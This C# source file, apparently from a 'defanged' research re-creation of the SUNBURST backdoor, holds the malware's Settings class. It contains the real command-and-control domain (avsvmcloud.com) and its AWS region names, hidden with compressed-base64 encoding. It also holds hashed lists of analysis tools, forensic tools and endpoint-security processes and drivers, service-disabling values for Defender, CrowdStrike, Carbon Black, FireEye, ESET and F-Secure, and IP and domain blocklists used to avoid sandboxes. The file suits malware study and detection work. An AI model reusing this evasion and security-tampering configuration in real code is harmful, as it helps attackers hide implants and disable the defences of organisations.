using System;
using System.IO.Pipes;

namespace SunBurstDefanged
{
	public static class Settings
	{
		public static bool bypassx = false;
		public static bool bypassr = false;
		public static bool printm = false;
		public static bool printp = false;
		public static bool printi = false;
		public static bool printy = false;
		public static bool forceu = false;

		public static string fakehost = "localhost";
		public static NamedPipeServerStream instance = null;

		public static volatile bool _svcListModified1 = false;
		public static volatile bool _svcListModified2 = false;

		public const int minInterval = 30;
		public const int maxInterval = 120;

		// (get) Token: 0x06000048 RID: 72 RVA: 0x000042A8 File Offset: 0x000024A8
		// (set) Token: 0x06000049 RID: 73 RVA: 0x000042F4 File Offset: 0x000024F4
		public static bool svcListModified1
		{
			get
			{
				object obj = svcListModifiedLock;
				bool result;
				lock (obj)
				{
					bool svcListModified = Settings._svcListModified1;
					Settings._svcListModified1 = false;
					result = svcListModified;
				}
				return result;
			}
			set
			{
				object obj = svcListModifiedLock;
				lock (obj)
				{
					Settings._svcListModified1 = value;
				}
			}
		}

		// (get) Token: 0x0600004A RID: 74 RVA: 0x00004338 File Offset: 0x00002538
		// (set) Token: 0x0600004B RID: 75 RVA: 0x0000437C File Offset: 0x0000257C
		public static bool svcListModified2
		{
			get
			{
				object obj = svcListModifiedLock;
				bool svcListModified;
				lock (obj)
				{
					svcListModified = Settings._svcListModified2;
				}
				return svcListModified;
			}
			set
			{
				object obj = svcListModifiedLock;
				lock (obj)
				{
					Settings._svcListModified2 = value;
				}
			}
		}
		private static readonly object svcListModifiedLock = new object();

		public static string userAgentOrionImprovementClient = null;
		public static string userAgentDefault = null;

		public static readonly string appId = "583da945-62af-10e8-4902-a8f205c72b2e"; //  ZipHelper.Unzip("M7UwTkm0NDHVNTNKTNM1NEi10DWxNDDSTbRIMzIwTTY3SjJKBQA=");
		public static readonly string reportStatusName = ZipHelper.Unzip("C0otyC8qCU8sSc5ILQpKLSmqBAA="); // ReportWatcherRetry
		public static readonly string serviceStatusName = ZipHelper.Unzip("C0otyC8qCU8sSc5ILQrILy4pyM9LBQA="); // ReportWatcherPostpone
		public static readonly string apiHost = ZipHelper.Unzip("SyzI1CvOz0ksKs/MSynWS87PBQA="); // api.solarwinds.com
		public static readonly string domain1 = ZipHelper.Unzip("SywrLstNzskvTdFLzs8FAA=="); // avsvmcloud.com
		public static readonly string domain2 = ZipHelper.Unzip("SywoKK7MS9ZNLMgEAA=="); // appsync-api

		public static readonly string[] domain3 = new string[]
		{
			ZipHelper.Unzip("Sy3VLU8tLtE1BAA="), // eu-west-1
			ZipHelper.Unzip("Ky3WLU8tLtE1AgA="), // us-west-2
			ZipHelper.Unzip("Ky3WTU0sLtE1BAA="), // us-east-1
			ZipHelper.Unzip("Ky3WTU0sLtE1AgA=")  // us-east-2
		};

		public static readonly string[] patternList = new string[]
		{
			ZipHelper.Unzip("07DP1NSIjkvUrYqtidPUKEktLoHzVTQB"), // "(?i)([^a-z]|^)(test)([^a-z]|$)"
			ZipHelper.Unzip("07DP1NQozs9JLCrPzEsp1gQA") // "(?i)(solarwinds)"
		};

		public static readonly ulong[] assemblyTimeStamps = new ulong[]
		{
			2597124982561782591UL,	// apimonitor-x64
			2600364143812063535UL,	// apimonitor-x86
			13464308873961738403UL,	// autopsy64			
			4821863173800309721UL,	// autopsy			
			12969190449276002545UL,	// autoruns64			
			3320026265773918739UL,	// autoruns
			12094027092655598256UL,	// autorunsc64
			10657751674541025650UL,	// autorunsc
			11913842725949116895UL,	// binaryninja			
			5449730069165757263UL,	// blacklight			
			292198192373389586UL,	// cff explorer			
			12790084614253405985UL,	// cutter			
			5219431737322569038UL,	// de4dot			
			15535773470978271326UL,	// debugview
			7810436520414958497UL,	// diskmon
			13316211011159594063UL,	// dnsd
			13825071784440082496UL,	// dnspy
			14480775929210717493UL,	// dotpeek32
			14482658293117931546UL,	// dotpeek64
			8473756179280619170UL,	// dumpcap
			3778500091710709090UL,	// evidence center
			8799118153397725683UL,	// exeinfope
			12027963942392743532UL, // fakedns
			576626207276463000UL,	// fakenet
			7412338704062093516UL,	// ffdec
			682250828679635420UL,	// fiddler
			13014156621614176974UL,	// fileinsight
			18150909006539876521UL, // floss
			10336842116636872171UL, // gdb
			12785322942775634499UL, // hiew32demo
			13260224381505715848UL, // hiew32
			17956969551821596225UL, // hollows_hunter 
			8709004393777297355UL,  // idaq64
			14256853800858727521UL, // idaq
			8129411991672431889UL,  // idr
			15997665423159927228UL, // ildasm
			10829648878147112121UL, // ilspy
			9149947745824492274UL,  // jd-gui
			3656637464651387014UL,  // lordpe
			3575761800716667678UL,  // officemalscanner
			4501656691368064027UL,  // ollydbg
			10296494671777307979UL, // pdfstreamdumper
			14630721578341374856UL, // pe-bear
			4088976323439621041UL,  // pebrowse64
			9531326785919727076UL,  // peid
			6461429591783621719UL,  // pe-sieve32
			6508141243778577344UL,  // pe-sieve64
			10235971842993272939UL, // pestudio
			2478231962306073784UL,  // peview
			9903758755917170407UL,  // pexplorer
			14710585101020280896UL, // ppee
			14710585101020280896UL, // ppee
			13611814135072561278UL, // procdump64
			2810460305047003196UL,  // procdump
			2032008861530788751UL,  // processhacker
			27407921587843457UL,    // procexp64
			6491986958834001955UL,  // procexp
			2128122064571842954UL,  // procmon
			10484659978517092504UL, // prodiscoverbasic
			8478833628889826985UL,  // py2exedecompiler
			10463926208560207521UL, // r2agent
			7080175711202577138UL,  // rabin2
			8697424601205169055UL,  // radare2
			7775177810774851294UL,  // ramcapture64
			16130138450758310172UL, // ramcapture
			506634811745884560UL,   // reflector
			18294908219222222902UL, // regmon
			3588624367609827560UL,  // resourcehacker
			9555688264681862794UL,  // retdec-ar-extractor
			5415426428750045503UL,  // retdec-bin2llvmir
			3642525650883269872UL,  // retdec-bin2pat
			13135068273077306806UL, // retdec-config
			3769837838875367802UL,  // retdec-fileinfo
			191060519014405309UL,   // retdec-getsig
			1682585410644922036UL,  // retdec-idr2pat
			7878537243757499832UL,  // retdec-llvmir2hll
			13799353263187722717UL, // retdec-macho-extractor
			1367627386496056834UL,  // retdec-pat2yara
			12574535824074203265UL, // retdec-stacofin
			16990567851129491937UL, // retdec-unpacker
			8994091295115840290UL,  // retdec-yarac
			13876356431472225791UL, // rundotnetdll
			14968320160131875803UL, // sbiesvc
			14868920869169964081UL, // scdbg
			106672141413120087UL,   // scylla_x64
			79089792725215063UL,    // scylla_x86
			5614586596107908838UL,  // shellcode_launcher
			3869935012404164040UL,  // solarwindsdiagnostics
			3538022140597504361UL,  // sysmon64
			14111374107076822891UL, // sysmon
			7982848972385914508UL,  // task explorer
			8760312338504300643UL,  // task explorer-64
			17351543633914244545UL, // tcpdump
			7516148236133302073UL,  // tcpvcon
			15114163911481793350UL, // tcpview
			15457732070353984570UL, // vboxservice
			16292685861617888592UL, // win32_remote
			10374841591685794123UL, // win64_remotex64
			3045986759481489935UL,  // windbg
			17109238199226571972UL, // windump
			6827032273910657891UL,  // winhex64
			5945487981219695001UL,  // winhex
			8052533790968282297UL,  // winobj
			17574002783607647274UL, // wireshark
			3341747963119755850UL,  // x32dbg
			14193859431895170587UL, // x64dbg
			17439059603042731363UL, // xwforensics64
			17683972236092287897UL, // xwforensics
			700598796416086955UL,   // redcloak
			3660705254426876796UL,  // avgsvc
			12709986806548166638UL, // avgui
			3890794756780010537UL,  // avgsvca
			2797129108883749491UL,  // avgidsagent
			3890769468012566366UL,  // avgsvcx
			14095938998438966337UL, // avgwdsvcx
			11109294216876344399UL, // avgadminclientservice
			1368907909245890092UL,  // afwserv
			11818825521849580123UL, // avastui
			8146185202538899243UL,  // avastsvc
			2934149816356927366UL,  // aswidsagent
			13029357933491444455UL, // aswidsagenta
			6195833633417633900UL,  // aswengsrv
			2760663353550280147UL,  // avastavwrapper
			16423314183614230717UL, // bccavsvc
			2532538262737333146UL,  // psanhost
			4454255944391929578UL,  // psuaservice
			6088115528707848728UL,  // psuamain
			13611051401579634621UL, // avp
			18147627057830191163UL, // avpui
			17633734304611248415UL, // ksde
			13581776705111912829UL, // ksdeui
			7175363135479931834UL,  // tanium
			3178468437029279937UL,  // taniumclient
			13599785766252827703UL, // taniumdetectengine
			6180361713414290679UL,  // taniumendpointindex
			8612208440357175863UL,  // taniumtracecli
			8408095252303317471UL   // taniumtracewebsocketclient64
		};

		public static readonly ulong[] configTimeStamps = new ulong[]
		{
			17097380490166623672UL, // cybkerneltracker.sys
			15194901817027173566UL, // atrsdfw.sys
			12718416789200275332UL, // eaw.sys
			18392881921099771407UL, // rvsavd.sys
			3626142665768487764UL,  // dgdmk.sys
			12343334044036541897UL, // sentinelmonitor.sys
			397780960855462669UL,   // hexisfsmonitor.sys
			6943102301517884811UL,  // groundling32.sys
			13544031715334011032UL, // groundling64.sys
			11801746708619571308UL, // safe-agent.sys
			18159703063075866524UL, // crexecprev.sys
			835151375515278827UL,   // psepfilter.sys
			16570804352575357627UL, // cve.sys
			1614465773938842903UL,  // brfilter.sys
			12679195163651834776UL, // brcow_x_x_x_x.sys
			2717025511528702475UL,  // lragentmf.sys
			17984632978012874803UL  // libwamf.sys
		};

		public static readonly ServiceConfiguration[] svcList = new ServiceConfiguration[]
		{
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// msmpeng
					5183687599225757871UL
				},
				Svc = new ServiceConfiguration.Service[]
				{
					new ServiceConfiguration.Service
					{
						// windefend
						timeStamp = 917638920165491138UL,
						started = true
					}
				}
			},
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// mssense
					10063651499895178962UL
				},
				Svc = new ServiceConfiguration.Service[]
				{
					new ServiceConfiguration.Service
					{
						// sense
						timeStamp = 16335643316870329598UL,
						started = true
					}
				}
			},
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// microsoft.tri.sensor
					10501212300031893463UL,
					// microsoft.tri.sensor.updater
					155978580751494388UL
				},
				Svc = new ServiceConfiguration.Service[0]
			},
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// cavp
					17204844226884380288UL,
					// cb
					5984963105389676759UL
				},
				Svc = new ServiceConfiguration.Service[]
				{
					new ServiceConfiguration.Service
					{
						// carbonblack
						timeStamp = 11385275378891906608UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// carbonblackk
						timeStamp = 13693525876560827283UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// cbcomms
						timeStamp = 17849680105131524334UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// cbstream
						timeStamp = 18246404330670877335UL,
						DefaultValue = 3U
					}
				}
			},
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// csfalconservice
					8698326794961817906UL,
					// csfalconcontainer
					9061219083560670602UL
				},
				Svc = new ServiceConfiguration.Service[]
				{
					new ServiceConfiguration.Service
					{
						// csagent
						timeStamp = 11771945869106552231UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// csdevicecontrol
						timeStamp = 9234894663364701749UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// csfalconservice
						timeStamp = 8698326794961817906UL,
						DefaultValue = 2U
					}
				}
			},
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// xagt
					15695338751700748390UL,
					// xagtnotif
					640589622539783622UL
				},
				Svc = new ServiceConfiguration.Service[]
				{
					new ServiceConfiguration.Service
					{
						// xagt
						timeStamp = 15695338751700748390UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// fe_avk
						timeStamp = 9384605490088500348UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// fekern
						timeStamp = 6274014997237900919UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// feelam
						timeStamp = 15092207615430402812UL,
						DefaultValue = 0U
					},
					new ServiceConfiguration.Service
					{
						// fewscservice
						timeStamp = 3320767229281015341UL,
						DefaultValue = 3U
					}
				}
			},
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					// ekrn
					3200333496547938354UL,
					// eguiproxy
					14513577387099045298UL,
					// egui
					607197993339007484UL
				},
				Svc = new ServiceConfiguration.Service[]
				{
					new ServiceConfiguration.Service
					{
						// eamonm
						timeStamp = 15587050164583443069UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// eelam
						timeStamp = 9559632696372799208UL,
						DefaultValue = 0U
					},
					new ServiceConfiguration.Service
					{
						// ehdrv
						timeStamp = 4931721628717906635UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// ekrn
						timeStamp = 3200333496547938354UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// ekrnepfw
						timeStamp = 2589926981877829912UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// epfwwfp
						timeStamp = 17997967489723066537UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// ekbdflt
						timeStamp = 14079676299181301772UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// epfw
						timeStamp = 17939405613729073960UL,
						DefaultValue = 1U
					}
				}
			},
			new ServiceConfiguration
			{
				timeStamps = new ulong[]
				{
					521157249538507889UL,   // fsgk32st
					14971809093655817917UL, // fswebuid
					10545868833523019926UL, // fsgk32
					15039834196857999838UL, // fsma32
					14055243717250701608UL, // fssm32
					5587557070429522647UL,  // fnrb32
					12445177985737237804UL, // fsaua
					17978774977754553159UL, // fsorsp
					17017923349298346219UL  // fsav32
				},
				Svc = new ServiceConfiguration.Service[]
				{
					new ServiceConfiguration.Service
					{
						// f-secure gatekeeper handler starter
						timeStamp = 17624147599670377042UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// f-secure network request broker
						timeStamp = 16066651430762394116UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// f-secure webui daemon
						timeStamp = 13655261125244647696UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// fsaua
						timeStamp = 12445177985737237804UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// fsma
						timeStamp = 3421213182954201407UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// fsorspclient
						timeStamp = 14243671177281069512UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// f-secure gatekeeper
						timeStamp = 16112751343173365533UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// f-secure hips
						timeStamp = 3425260965299690882UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// fsbts
						timeStamp = 9333057603143916814UL,
						DefaultValue = 0U
					},
					new ServiceConfiguration.Service
					{
						// fsni
						timeStamp = 3413886037471417852UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// fsvista
						timeStamp = 7315838824213522000UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// f-secure filter
						timeStamp = 13783346438774742614UL,
						DefaultValue = 4U
					},
					new ServiceConfiguration.Service
					{
						// f-secure recognizer
						timeStamp = 2380224015317016190UL,
						DefaultValue = 4U
					},
					new ServiceConfiguration.Service
					{
						// fses
						timeStamp = 3413052607651207697UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// fsfw
						timeStamp = 3407972863931386250UL,
						DefaultValue = 1U
					},
					new ServiceConfiguration.Service
					{
						// fsdfw
						timeStamp = 10393903804869831898UL,
						DefaultValue = 3U
					},
					new ServiceConfiguration.Service
					{
						// fsaus
						timeStamp = 12445232961318634374UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// fsms
						timeStamp = 3421197789791424393UL,
						DefaultValue = 2U
					},
					new ServiceConfiguration.Service
					{
						// fsdevcon
						timeStamp = 541172992193764396UL,
						DefaultValue = 2U
					}
				}
			}
		};

		public static readonly IPAddressesHelper[] nList = new IPAddressesHelper[]
		{
			// "10.0.0.0"
			// "255.0.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzTQA0MA"), ZipHelper.Unzip("MzI11TMAQQA="), AddressFamilyEx.Atm),
			// "172.16.0.0"
			// "255.240.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzQ30jM00zPQMwAA"), ZipHelper.Unzip("MzI11TMyMdADQgA="), AddressFamilyEx.Atm),
			// "192.168.0.0"
			// "255.255.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("M7Q00jM0s9Az0DMAAA=="), ZipHelper.Unzip("MzI11TMCYgM9AwA="), AddressFamilyEx.Atm),
			// "224.0.0.0"
			// "240.0.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzIy0TMAQQA="), ZipHelper.Unzip("MzIx0ANDAA=="), AddressFamilyEx.Atm),
			// "fc00::"
			// "fe00::"
			new IPAddressesHelper(ZipHelper.Unzip("S0s2MLCyAgA="), ZipHelper.Unzip("S0s1MLCyAgA="), AddressFamilyEx.Atm),
			// "fec0::"
			// "ffc0::"
			new IPAddressesHelper(ZipHelper.Unzip("S0tNNrCyAgA="), ZipHelper.Unzip("S0tLNrCyAgA="), AddressFamilyEx.Atm),
			// "ff00::"
			// "ff00::"
			new IPAddressesHelper(ZipHelper.Unzip("S0szMLCyAgA="), ZipHelper.Unzip("S0szMLCyAgA="), AddressFamilyEx.Atm),
			// "41.84.159.0"
			// "255.255.255.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzHUszDRMzS11DMAAA=="), ZipHelper.Unzip("MzI11TOCYgMA"), AddressFamilyEx.Ipx),
			// "74.114.24.0"
			// "255.255.248.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzfRMzQ00TMy0TMAAA=="), ZipHelper.Unzip("MzI11TMCYRMLPQMA"), AddressFamilyEx.Ipx),
			// "154.118.140.0"
			// "255.255.255.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzQ10TM0tNAzNDHQMwAA"), ZipHelper.Unzip("MzI11TOCYgMA"), AddressFamilyEx.Ipx),
			// "217.163.7.0"
			// "255.255.255.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzI01zM0M9Yz1zMAAA=="), ZipHelper.Unzip("MzI11TOCYgMA"), AddressFamilyEx.Ipx),
			// "20.140.0.0"
			// "255.254.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzLQMzQx0ANCAA=="), ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), AddressFamilyEx.ImpLink),
			// "96.31.172.0"
			// "255.255.255.0"
			new IPAddressesHelper(ZipHelper.Unzip("szTTMzbUMzQ30jMAAA=="), ZipHelper.Unzip("MzI11TOCYgMA"), AddressFamilyEx.ImpLink),
			// "131.228.12.0"
			// "255.255.252.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzQ21DMystAzNNIzAAA="), ZipHelper.Unzip("MzI11TMCYyM9AwA="), AddressFamilyEx.ImpLink),
			// "144.86.226.0"
			// "255.255.255.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzQx0bMw0zMyMtMzAAA="), ZipHelper.Unzip("MzI11TOCYgMA"), AddressFamilyEx.ImpLink),
			// "8.18.144.0"
			// "255.255.254.0"
			new IPAddressesHelper(ZipHelper.Unzip("s9AztNAzNDHRMwAA"), ZipHelper.Unzip("MzI11TMCYxM9AwA="), AddressFamilyEx.NetBios),
			// "18.130.0.0"
			// "255.255.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("M7TQMzQ20ANCAA=="), ZipHelper.Unzip("MzI11TMCYgM9AwA="), AddressFamilyEx.NetBios, true),
			// "71.152.53.0"
			// "255.255.255.0"
			new IPAddressesHelper(ZipHelper.Unzip("MzfUMzQ10jM11jMAAA=="), ZipHelper.Unzip("MzI11TOCYgMA"), AddressFamilyEx.NetBios),
			// "99.79.0.0"
			// "255.255.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("s7TUM7fUM9AzAAA="), ZipHelper.Unzip("MzI11TMCYgM9AwA="), AddressFamilyEx.NetBios, true),
			// "87.238.80.0"
			// "255.255.248.0"
			new IPAddressesHelper(ZipHelper.Unzip("szDXMzK20LMw0DMAAA=="), ZipHelper.Unzip("MzI11TMCYRMLPQMA"), AddressFamilyEx.NetBios),
			// "199.201.117.0"
			// "255.255.255.0"
			new IPAddressesHelper(ZipHelper.Unzip("M7S01DMyMNQzNDTXMwAA"), ZipHelper.Unzip("MzI11TOCYgMA"), AddressFamilyEx.NetBios),
			// "184.72.0.0"
			// "255.254.0.0"
			new IPAddressesHelper(ZipHelper.Unzip("M7Qw0TM30jPQMwAA"), ZipHelper.Unzip("MzI11TMyNdEz0DMAAA=="), AddressFamilyEx.NetBios, true)
		};

		public static readonly ulong[] patternHashes = new ulong[]
		{
			1109067043404435916UL,  // swdev.local
			15267980678929160412UL, // swdev.dmz
			8381292265993977266UL,  // lab.local
			3796405623695665524UL,  // lab.na
			8727477769544302060UL,  // emea.sales
			10734127004244879770UL, // cork.lab
			11073283311104541690UL, // dev.local
			4030236413975199654UL,  // dmz.local
			7701683279824397773UL,  // pci.local
			5132256620104998637UL,  // saas.swi
			5942282052525294911UL,  // lab.rio
			4578480846255629462UL,  // lab.brno
			16858955978146406642UL  // apac.lab
		};
	}
}
